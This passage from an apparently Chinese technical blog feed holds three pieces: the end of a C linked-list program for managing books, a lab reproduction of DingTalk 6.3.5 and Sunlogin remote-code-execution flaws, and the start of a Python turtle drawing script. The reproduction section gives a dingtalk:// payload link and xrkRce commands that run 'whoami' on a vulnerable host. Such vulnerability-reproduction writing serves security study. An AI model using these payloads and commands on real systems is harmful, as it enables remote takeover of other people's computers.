operator">*</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    Node <span class="token operator">*</span>pNode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>            <span class="token function">free</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>            <span class="token keyword">return</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>        <span class="token keyword">else</span></pre></td></tr><tr><td data-num="118"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"List null!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="121"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>next<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="127"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>            head<span class="token operator">-></span>next <span class="token operator">=</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>            <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>            head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">=</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>            <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    </pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="144"></td><td><pre></pre></td></tr><tr><td data-num="145"></td><td><pre><span class="token comment">// 单链表</span></pre></td></tr><tr><td data-num="146"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>    <span class="token comment">// 链表头指针</span></pre></td></tr><tr><td data-num="149"></td><td><pre>    Node <span class="token operator">*</span>head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>        <span class="token keyword">char</span> szBookName<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>        <span class="token keyword">float</span> nBookPrice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>        <span class="token keyword">float</span> NewBookPrice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token keyword">int</span> nBookNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>        <span class="token keyword">int</span> nflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="157"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请选择您要使用的功能：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.添加书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2.查询书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3.修改书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4.删除书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nflag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>nflag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="164"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="165"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="166"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入定价："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nBookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>            head <span class="token operator">=</span> <span class="token function">AppendNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">,</span>nBookNumber<span class="token punctuation">,</span>nBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="173"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="174"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="175"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre>            <span class="token function">QueryNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="180"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="181"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入新定价："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="183"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>NewBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>            <span class="token function">ModeifyNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">,</span>NewBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="187"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="189"></td><td><pre>            head <span class="token operator">=</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="191"></td><td><pre>        <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="192"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="193"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="194"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="196"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Dingtalk6.3.5 and 向日葵RCE复现</title>
    <url>/article/1b0513b6.html</url>
    <content><![CDATA[<h1 id="dingtalk635-rce"><a class="anchor" href="#dingtalk635-rce">#</a> Dingtalk6.3.5  RCE</h1>
<h2 id="项目地址"><a class="anchor" href="#项目地址">#</a> 项目地址</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyYXp5MHg3MC9kaW5ndGFsay1SQ0U=">项目链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217133733650.png" alt="image-20220217133733650" /></p>
<h2 id="项目测试"><a class="anchor" href="#项目测试">#</a> 项目测试</h2>
<p>将 <code>test.html</code>  放入 XP 的网站目录当中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217134128115.png" alt="image-20220217134128115" /></p>
<p>在虚拟机中启动 XP</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217133001242.png" alt="image-20220217133001242" /></p>
<p>在钉钉中随便打开一个会话窗口，发送 payload，然后点击 payload</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dingtalk://dingtalkclient/page/link?url<span class="token operator">=</span><span class="token number">127.0</span>.0.1/test.html<span class="token operator">&amp;</span><span class="token assign-left variable">pc_slide</span><span class="token operator">=</span>true</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#127.0.0.1 依据测试 IP 进行更改即可</span></pre></td></tr></table></figure><p>如此时虚拟机的测试 IP 为 &quot;192.168.146.139&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217134336105.png" alt="image-20220217134336105" /></p>
<p>在钉钉中输入 payload</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dingtalk://dingtalkclient/page/link?url<span class="token operator">=</span><span class="token number">192.168</span>.146.139/test.html<span class="token operator">&amp;</span><span class="token assign-left variable">pc_slide</span><span class="token operator">=</span>true</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217134659616.png" alt="image-20220217134659616" /></p>
<p>点击 payload，有窗口弹出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217134810503.png" alt="image-20220217134810503" /></p>
<p>后电脑计算器弹出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217134841513.png" alt="image-20220217134841513" /></p>
<h1 id="向日葵rce"><a class="anchor" href="#向日葵rce">#</a> 向日葵 RCE</h1>
<h2 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 漏洞描述</h2>
<p>向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p>
<p>上海贝锐信息科技股份有限公司向日葵个人版 for Windows 存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。</p>
<h2 id="存在漏洞版本"><a class="anchor" href="#存在漏洞版本">#</a> 存在漏洞版本</h2>
<p>上海贝锐信息科技股份有限公司 向日葵个人版 for Windows 11.0.0.33 &lt;=</p>
<p>上海贝锐信息科技股份有限公司 向日葵简约版 V1.0.1.43315（2021.12）</p>
<h2 id="项目地址-2"><a class="anchor" href="#项目地址-2">#</a> 项目地址</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NpYmVyaWFoMGgvQ1ZFLUNOVkQtSFVC">项目链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217135040014.png" alt="image-20220217135040014" /></p>
<h2 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h2>
<h3 id="项目安装"><a class="anchor" href="#项目安装">#</a> 项目安装</h3>
<p>下面我们来对漏洞进行相关复现，将上面的项目下载后得到以下内容</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217135608164.png" alt="image-20220217135608164" /></p>
<p>双击向日葵安装应用进行向日葵 Ver.11.0.0.33162 的安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217140003186.png" alt="image-20220217140003186" /></p>
<h3 id="漏洞检测"><a class="anchor" href="#漏洞检测">#</a> 漏洞检测</h3>
<p>使用 sunlogin_rce 工具来检测该漏洞，因为该工具使用 Go 语言编写，所以在使用之前我们需要安装 Go 环境</p>
<h4 id="环境安装"><a class="anchor" href="#环境安装">#</a> 环境安装</h4>
<h5 id="kali中安装go环境"><a class="anchor" href="#kali中安装go环境">#</a> kali 中安装 go 环境</h5>
<p>下载安装包</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">wget</span> -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217140733168.png" alt="image-20220217140733168" /></p>
<p>下载完后，解压到  <code>/usr/local</code>  目录下</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">tar</span> -C /usr/local/ -xzf go1.8.3.linux-amd64.tar.gz</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217140850736.png" alt="image-20220217140850736" /></p>
<p>vim 打开文件.profile</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/profile</pre></td></tr></table></figure><p>在文件内容后面加上 <code>export PATH=$PATH:/usr/local/go/bin</code>  后保存</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217141300051.png" alt="image-20220217141300051" /></p>
<p>执行以下命令，使环境变量立即生效</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">source</span> /etc/profile</pre></td></tr></table></figure><p>这样 kali 下的 go 环境就安装成功了</p>
<p>查看 go 版本</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go version</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217141349520.png" alt="image-20220217141349520" /></p>
<h5 id="windows下安装go环境"><a class="anchor" href="#windows下安装go环境">#</a> windows 下安装 go 环境</h5>
<p>去<span class="exturl" data-url="aHR0cHM6Ly9zdHVkeWdvbGFuZy5jb20vZGw=">中文社区的下载栏目</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144113981.png" alt="image-20220217144113981" /></p>
<p>找到 Microsoft Windows，下载完成之后，一步步安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144219485.png" alt="image-20220217144219485" /></p>
<p>等待安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144325749.png" alt="image-20220217144325749" /></p>
<p>安装完成之后，进到 Dos 也就是 cmd 中，输入 <code>go env</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144412533.png" alt="image-20220217144412533" /></p>
<p>然后配置环境变量，GOPATH，也就是指向 GO 的安装目录文件夹</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144618049.png" alt="image-20220217144618049" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144746113.png" alt="image-20220217144746113" /></p>
<p>配置 Go 项目存放地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217144917859.png" alt="image-20220217144917859" /></p>
<h4 id="项目测试-2"><a class="anchor" href="#项目测试-2">#</a> 项目测试</h4>
<p>使用 <code>go build</code>  进行编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217145212672.png" alt="image-20220217145212672" /></p>
<p>报错 QAQ</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go: github.com/EDDYCJY/fake-useragent@v0.2.0: Get <span class="token string">"https://proxy.golang.org/github.com/%21e%21d%21d%21y%21c%21j%21y/fake-useragent/@v/v0.2.0.mod"</span><span class="token builtin class-name">:</span> dial tcp <span class="token number">172.217</span>.163.49:443: connectex: No connection could be made because the target machine actively refused it.</pre></td></tr><tr><td data-num="2"></td><td><pre>go: downloading github.com/go-resty/resty/v2 v2.7.0</pre></td></tr><tr><td data-num="3"></td><td><pre>go: downloading github.com/tidwall/gjson v1.14.0</pre></td></tr><tr><td data-num="4"></td><td><pre>go: github.com/EDDYCJY/fake-useragent@v0.2.0: Get <span class="token string">"https://proxy.golang.org/github.com/%21e%21d%21d%21y%21c%21j%21y/fake-useragent/@v/v0.2.0.mod"</span><span class="token builtin class-name">:</span> dial tcp <span class="token number">172.217</span>.163.49:443: connectex: No connection could be made because the target machine actively refused it.</pre></td></tr></table></figure><p>默认使用的是 <code>proxy.golang.org</code> ，在国内无法访问</p>
<p>换一个国内能访问的代理地址：<span class="exturl" data-url="aHR0cHM6Ly9nb3Byb3h5LmNu">https://goproxy.cn</span></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go <span class="token function">env</span> -w <span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://goproxy.cn</pre></td></tr></table></figure><p>再次执行即可完美通过！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217152431742.png" alt="image-20220217152431742" /></p>
<p>可以发现我们在编译之后文件夹中多出了 xrkRce 的文件。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217152454308.png" alt="image-20220217152454308" /></p>
<p>我们可以使用命令： <code>.\xrkRce.exe -h</code>  来查看使用方法。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217152531184.png" alt="image-20220217152531184" /></p>
<p>我们使用命令：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./xrkRce.exe -h <span class="token number">192.168</span>.146.139</pre></td></tr></table></figure><p>来扫描安装漏洞版向日葵的目标主机 ( <code>192.168.146.139</code> )，发现其 <code>50570</code>  端口存在 Rce 漏洞。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217152815908.png" alt="image-20220217152815908" /></p>
<p>我们使用以下命令来进行验证</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./xrkRce.exe -h <span class="token number">192.168</span>.146.139 -t rce -p <span class="token number">50570</span> -c <span class="token string">"whoami"</span></pre></td></tr></table></figure><p>发现其成功执行 <code>whoami</code>  命令</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220217152956568.png" alt="image-20220217152956568" /></p>
<h1 id="注意事项"><a class="anchor" href="#注意事项">#</a> 注意事项</h1>
<p><code>该项目仅可用于研究使用,切勿用于非法犯罪活动,未经双方同意使用此项目攻击目标是非法的.</code></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Just Do It For Play : bingdundun</title>
    <url>/article/60ec5e3d.html</url>
    <content><![CDATA[<p>2022 冬奥会，加油！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220209190647416.png" alt="image-20220209190647416" /></p>
<p>利用 python 自带包 turtle 实现冰墩墩自由，通过 python3 执行脚本文件就可以画出一个冰墩墩哦！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220209181501075.png" alt="image-20220209181501075" /></p>
<p><strong>脚本实例</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 依赖于 python 包 turtle 实现冰墩墩自由</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 通过 python3 执行脚本文件就可以画出一个冰墩墩哦！</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># actor：21r000</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> turtle</pre></td></tr><tr><td data-num="6"></td><td><pre>turtle<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'21r000'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 速度</span></pre></td></tr><tr><td data-num="8"></td><td><pre>turtle<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 左手</span></pre></td></tr><tr><td data-num="11"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>turtle<span class="token 